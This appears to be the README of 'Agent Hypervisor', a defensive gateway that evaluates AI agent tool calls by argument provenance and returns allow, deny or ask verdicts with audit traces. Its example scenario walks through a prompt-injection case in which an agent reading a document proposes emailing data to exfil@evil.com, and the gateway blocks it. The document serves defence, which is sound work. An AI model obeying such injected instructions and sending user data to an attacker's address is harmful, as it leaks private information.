# Agent Hypervisor

![Tests](https://img.shields.io/badge/tests-399%20passing-brightgreen)
![Python](https://img.shields.io/badge/python-3.10%2B-blue)
![License](https://img.shields.io/badge/license-Apache%202.0-blue)

**Agent Hypervisor is an execution governance gateway for AI agent tools.**

It enforces policy at the execution boundary — between the LLM deciding to
call a tool and the tool actually running. Every tool call is evaluated
against the provenance of its arguments before anything executes.

---

## 1. What Problem This Solves

AI agents use tools that cause real-world side effects: sending email, writing
files, making HTTP requests. Two attack classes exploit this:

**Prompt injection** — an attacker embeds malicious instructions inside content
the agent reads. The agent follows those instructions and routes attacker-controlled
data to a side-effect tool.

**Data exfiltration** — an agent processing sensitive data is manipulated into
sending that data to an attacker-controlled endpoint through a legitimate-looking
tool call.

Current defenses operate at the prompt layer — classifying whether inputs
_look_ malicious. This approach is probabilistic and operates at the wrong
boundary: by the time a tool is called, it is too late.

Agent Hypervisor enforces control where it matters: **at the execution boundary**,
structurally, before any tool runs.

---

## 2. The Execution Governance Concept

Every tool argument carries a **provenance label** — where it came from:

| Provenance class    | Meaning                                              |
|---------------------|------------------------------------------------------|
| `external_document` | Content from files, emails, web pages (untrusted)    |
| `derived`           | Computed from parents (inherits least-trusted parent)|
| `user_declared`     | Declared by the operator in the task (trusted)       |
| `system`            | Hardcoded — no user or document influence            |

Provenance is **sticky through derivation**: if an email address is extracted
from an external document, the resulting value traces back to
`external_document` — even through intermediate variables.

At execution time, the gateway walks the full derivation chain of every
argument and evaluates a policy. A three-way verdict controls what happens:

- **allow** — tool executes, result returned
- **deny** — blocked, reason and trace recorded
- **ask** — held pending human approval; `approval_id` returned

The check is deterministic. There are no classifiers to fool.

---

## 3. Architecture

```
  Agent / LLM Runtime
       │
       │  POST /tools/execute  {tool, arguments with provenance}
       ▼
  ┌─────────────────────────────────────────────────────────────┐
  │                 Agent Hypervisor Gateway                    │
  │                                                             │
  │  1. Resolve provenance chains  (full derivation DAG)        │
  │  2. PolicyEngine.evaluate()    (declarative YAML rules)     │
  │  3. ProvenanceFirewall.check() (structural rules)           │
  │  4. Combine verdicts:  deny > ask > allow                   │
  │  5. Write TraceEntry   (always — all verdicts)              │
  │                                                             │
  │       deny          ask           allow                     │
  │       403           200            200                      │
  │                  approval        execute                    │
  │                  record          adapter                    │
  └─────────────────────────────────────────────────────────────┘
```

All decisions persist and survive process restarts. Every trace entry links
to the exact policy version active when the decision was made.

Integration via MCP:

```
  Agent (MCP client)
    │  JSON-RPC tools/call
    ▼
  MCP Adapter  (port 9090)
    │  POST /tools/execute with provenance labels
    ▼
  Agent Hypervisor Gateway  (port 8080)
    │  Execution Governance
    ▼
  Tool Execution
```

---

## 4. Quickstart Demo

```bash
pip install fastapi uvicorn pyyaml
python scripts/run_showcase_demo.py
```

This starts the gateway and runs a three-scenario demo showing all 8 steps
of the execution governance lifecycle:

```
STEP 1 — agent proposes tool call
STEP 2 — provenance analysis
STEP 3 — policy evaluation
STEP 4 — ask verdict
STEP 5 — approval granted
STEP 6 — tool execution
STEP 7 — trace recorded
STEP 8 — policy tuner analysis
```

---

## 5. Example Scenario

An agent reads a customer report and proposes to email a summary to the
account manager. The body is derived from the external document. The
recipient was declared by the operator.

```
external_document  (q3_report.pdf)
  → agent processes document
  → agent proposes: send_email(to=alice@company.com, body=<Q3 summary>)
  → gateway: to=user_declared → policy: ask-email-declared-recipient → verdict=ask
  → reviewer inspects tool call, grants approval
  → send_email executes
  → trace stored with policy version link
  → policy tuner notes the approval pattern
```

Simultaneously, the document contained an injected instruction:

```
  → agent also proposes: send_email(to=exfil@evil.com, ...)
  → gateway: to=external_document → policy: deny-email-external-recipient → verdict=deny
  → tool NOT executed — deterministic block
  → trace stored
```

The exfiltration attempt is blocked structurally. The legitimate email
proceeds after human review. Both decisions are traced.

**Policy rules driving this scenario:**

```yaml
# policies/default_policy.yaml (excerpt)

# Recipient from external content → block
- id: deny-email-external-recipient
  tool: send_email
  argument: to
  provenance: external_document
  verdict: deny

# Declared recipient → hold for human confirmation
- id: ask-email-declared-recipient
  tool: send_email
  argument: to
  provenance: user_declared
  verdict: ask
```

---

## 6. Integration Path

### Python client (zero dependencies)

```python
from agent_hypervisor.gateway_client import GatewayClient, arg

client = GatewayClient("http://localhost:8080")

# Agent proposes a tool call with provenance labels
resp = client.execute_tool("send_email", {
    "to":      arg("alice@company.com", "user_declared", role="recipient_source"),
    "subject": arg("Q3 Report", "system"),
    "body":    arg("Revenue up 12%.", "derived", label="q3_report.pdf"),
})
# → verdict=ask, approval_id="ab3f..."

# Reviewer approves
result = client.submit_approval("ab3f...", approved=True, actor="alice-security")
# → verdict=allow, result={...}
```

### MCP (Model Context Protocol)

```bash
# Terminal 1 — gateway
python scripts/run_gateway.py

# Terminal 2 — MCP adapter
python examples/integrations/mcp_gateway_full_example.py

# Terminal 3 — canonical demo
python examples/integrations/mcp_gateway_full_example.py --demo
```

See [docs/mcp_integration.md](docs/mcp_integration.md) for the full MCP
integration guide.

### HTTP REST API (framework-agnostic)

```bash
# Execute a tool call
curl -X POST http://localhost:8080/tools/execute \
     -H "Content-Type: application/json" \
     -d '{
       "tool": "send_email",
       "arguments": {
         "to":      {"value": "alice@company.com", "source": "user_declared"},
         "subject": {"value": "Q3 Report",         "source": "system"},
         "body":    {"value": "Revenue up 12%.",   "source": "derived"}
       }
     }'

# Approve a pending tool call
curl -X POST http://localhost:8080/approvals/<approval_id> \
     -d '{"approved": true, "actor": "reviewer"}'

# Query audit trail
curl http://localhost:8080/traces
curl http://localhost:8080/approvals
curl http://localhost:8080/policy/history
```

---

## 7. Repository Structure

```
src/agent_hypervisor/           core runtime
  models.py                     ValueRef, ToolCall, Decision — provenance data model
  provenance.py                 resolve_chain(), mixed_provenance()
  firewall.py                   ProvenanceFirewall — structural rules
  policy_engine.py              PolicyEngine — declarative YAML evaluator
  gateway/
    gateway_server.py           FastAPI app, all HTTP endpoints
    execution_router.py         enforcement pipeline, approval workflow
    tool_registry.py            built-in tool adapters
  storage/
    trace_store.py              append-only JSONL trace log
    approval_store.py           per-file JSON approval records
    policy_store.py             JSONL policy version history
  policy_tuner/
    analyzer.py                 signal and smell detection from trace data
    suggestions.py              candidate policy improvements
    reporter.py                 JSON and Markdown report formatting
    models.py                   TunerReport, RuleMetrics, TuningSignal, Suggestion
  policy_editor/
    policy_editor.py            load, validate, list, preview, risk score, scope hints
    policy_models.py            PolicyFile, PolicyRuleSpec, RuleImpact

scripts/
  run_gateway.py                start the gateway server
  run_showcase_demo.py          run the 60-second governance demo
  run_policy_tuner.py           governance analysis report

examples/
  showcase/showcase_demo.py         end-to-end demo (all 8 steps)
  integrations/
    mcp_gateway_full_example.py     MCP integration with canonical scenario
    approval_flow_example.py        approval workflow pattern
    langchain_gateway_example.py    LangChain integration
    ide_agent_governance_demo.py    self-contained governance demo (3 scenarios)

policies/default_policy.yaml    baseline rules (10 rules)
gateway_config.yaml             gateway server configuration

docs/                           documentation (see table below)
tests/                          399 tests
```

---

## 8. Documentation

| Document | What it covers |
|---|---|
| [execution_governance.md](docs/execution_governance.md) | Architecture, canonical scenario, threat analysis |
| [mcp_integration.md](docs/mcp_integration.md) | MCP integration guide — setup, routing, approvals, traces |
| [gateway_architecture.md](docs/gateway_architecture.md) | Full HTTP API, enforcement pipeline, component map |
| [policy_engine.md](docs/policy_engine.md) | Declarative rule evaluation |
| [provenance_model.md](docs/provenance_model.md) | ValueRef, chains, mixed provenance |
| [audit_model.md](docs/audit_model.md) | Trace / approval / policy version field reference |
| [policy_tuner.md](docs/policy_tuner.md) | Governance-time analysis and suggestions |
| [integrations.md](docs/integrations.md) | GatewayClient, MCP, curl examples |
| [threat_model.md](docs/threat_model.md) | Attacks in scope and explicit non-goals |
| [benchmark_brief.md](docs/benchmark_brief.md) | Attack surface and defense comparison |
| [execution_governance_diagram.md](docs/execution_governance_diagram.md) | Architecture diagram — full governance flow |

---

## 9. Execution Governance

### Prompt Filtering vs. Execution Governance

Most AI safety tooling today operates at the **prompt layer** — classifying
whether user input or model output _looks_ malicious before it reaches the
model. This is useful, but insufficient for agentic systems.

**Prompt filtering** asks: _"Does this text look dangerous?"_

- Operates on text before (or after) the model
- Probabilistic: can be bypassed by rephrasing, encoding, or indirect injection
- Acts at the wrong boundary: a prompt filter cannot stop a tool call that the
  model has already decided to make
- Cannot enforce structural constraints on data provenance

**Execution governance** asks: _"Where did this data come from, and is it safe
to act on it now?"_

- Operates at the tool execution boundary — after reasoning, before action
- Deterministic: checks are structural (provenance chain walks), not classifiers
- Enforces the right boundary: every tool call is evaluated before it runs
- Cannot be bypassed by rephrasing — the provenance label travels with the data

```
  Prompt Filtering        Execution Governance
  ────────────────        ────────────────────
  User input              Tool call arguments
       │                        │
       ▼                        ▼
  [classifier]            [provenance check]
  "looks safe?"           "where did this come from?"
       │                        │
       ▼                        ▼
  Model reasoning         Tool execution (or block)
       │
       ▼
  Tool execution    ← prompt filtering stops here
```

The two approaches are complementary. Prompt filtering reduces the volume of
malicious instructions reaching the model. Execution governance ensures that
even if the model is manipulated, the resulting tool calls are still evaluated
structurally before any side effect occurs.

### The Governance Lifecycle

Every tool call in a governed agent goes through five steps:

```
  1. Agent proposes a tool call with provenance labels per argument
  2. Provenance chain resolution — walk the full derivation DAG
  3. Policy Engine evaluates declarative YAML rules → verdict
  4. Provenance Firewall checks structural invariants → verdict
  5. Merge verdicts (deny > ask > allow) → execute or block
```

All decisions are traced regardless of verdict, linking to the exact policy
version active at decision time. The Policy Tuner analyzes trace data offline
to detect patterns, compute rule risk scores, and suggest improvements.

### Running the Governance Demo

```bash
# Self-contained, no gateway required:
python examples/integrations/ide_agent_governance_demo.py
```

This runs three scenarios inline:

1. **Safe read** — `read_file` with system provenance → allowed automatically
2. **Prompt injection** — `send_email` with `external_document` recipient → denied
3. **Risky with approval** — `shell_exec` destructive command → ask → simulated approval → executed

### Policy Editor

The policy editor provides a read-only interface for inspecting policy files:

```python
from agent_hypervisor.policy_editor import PolicyEditor

editor = PolicyEditor()
policy = editor.load_policy("policies/default_policy.yaml")

# Validate all rules
errors = editor.validate(policy)  # {} means valid

# List rules as a table
print(editor.list_rules(policy))

# Preview rule impact (dry-run)
impact = editor.preview_rule(policy, "deny-email-external-recipient")
print(impact.summary())
# → Rule 'deny-email-external-recipient' → DENY: matches ~2 case(s). Targeted deny on low-trust provenance.

# Risk score for a rule (0–10)
rule = policy.get_rule("ask-email-declared-recipient")
score = editor.rule_risk_score(rule)  # e.g. 3

# Scope reduction hint
print(editor.scope_reduction_hint(rule))
```

### Policy Tuner Reports

Policy tuner reports now include per-rule governance metrics:

```bash
python scripts/run_policy_tuner.py
```

Report sections:
- **Summary** — total traces, approvals, verdict breakdown
- **Per-Rule Governance Metrics** — risk score (0–10), usage count, scope reduction hints
- **Rule Verdict Breakdown** — per-rule allow/ask/deny counts
- **Tuning Signals** — friction, risk, scope drift patterns
- **Policy Smells** — structural quality issues
- **Candidate Suggestions** — conservative improvement actions for human review

